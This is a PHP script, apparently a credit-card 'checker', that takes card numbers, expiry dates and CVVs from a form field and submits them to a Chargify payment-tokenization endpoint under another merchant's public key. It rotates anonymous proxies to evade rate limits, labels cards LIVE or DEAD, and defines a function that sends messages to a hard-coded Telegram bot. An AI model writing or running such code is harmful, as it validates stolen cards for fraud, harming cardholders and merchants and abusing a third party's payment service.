<?php
error_reporting(1);
function kirim($messaggio) {
	$chatID = "-342369034,";
    $token = "898238518:AAFp2Wx9TbeLVNE1oYTsO7WisuBdjtX1Wfg";
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    
}

$cc = $_POST['ccarea'];
//$proxy = $_POST['proxy'];

function getProxy(){

	$fp = fopen('proxy','w');
	$json = file_get_contents('https://www.proxydocker.com/en/proxylist/api?email=heaths%40ehmemail.com&country=all&city=all&port=all&type=http-https&anonymity=ELITE&state=all&need=all&format=json');

	$pr = json_decode($json)->Proxies;
	$c = count($pr);
	$select = $pr[rand(0,$c)];

	return $select->ip.':'.$select->port;
}

function check($cc,$proxy=null){

	$cc = str_replace(' ', '', $cc);

	if(preg_match('^/^', $cc)){

		$cc = str_replace('/', '|', $cc);
	}

	$ccn = $cc;
	$cc = explode('|', $cc);
	$ccno   = $cc[0];
	$ccm    = $cc[1];
	$ccy    = '20'.$cc[2];
	$cvv    = $cc[3];

	$ch = curl_init();

	curl_setopt($ch, CURLOPT_URL, 'https://pingdom-na-usd-prod.chargify.com/js/tokens.json');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"key\":\"chjs_9gcvvxbtrs6k5kyk4jzzfj8q\",\"revision\":\"2019-07-08a\",\"credit_card\":{\"full_number\":\"".$ccno."\",\"expiration_month\":\"".$ccm."\",\"expiration_year\":\"".$ccy."\",\"cvv\":\"".$cvv."\",\"first_name\":\"slebew\",\"last_name\":\"slebew\",\"billing_address\":\"356 Oakwood Ave\",\"billing_zip\":\"65432\",\"billing_state\":\"CA\",\"billing_city\":\"tretretre\",\"billing_country\":\"US\"}}");
	curl_setopt($ch, CURLOPT_PROXY, $proxy);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

	$headers = array();
	$headers[] = 'Sec-Fetch-Mode: cors';
	$headers[] = 'Referer: https://js.chargify.com/latest/hosted-field.html';
	$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36';
	$headers[] = 'Content-Type: application/json';
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

	$result = curl_exec($ch);
	
	
	curl_close($ch);
	
	if(preg_match('^Your request was denied due to a usage violation^', $result)){
		return 'Gagal';
	}else{
		return $result;
	}


}





function proses($proxy=null){
	
	$cc = $_POST['ccarea'];

	$cek = check($cc);

	if($cek=="Gagal"){
		$cek = check($cc,getProxy());
	}
	
	$resp = json_decode($cek);
	$hasil = $resp->errors;

	if(isset($resp->token)==true){

		$h = 'LIVE =>'.$cc;
	}else if($hasil==null){
		$h = 'Failed ['.$hasil.'] => '.$cc;

	}else{

		$h = 'DEAD ['.$hasil.'] => '.$cc;
	}
	
	#echo '<script>console.log('.$resp.');</script>';
	return $h;

	

}

$hasil = proses();
print_r($hasil);





?>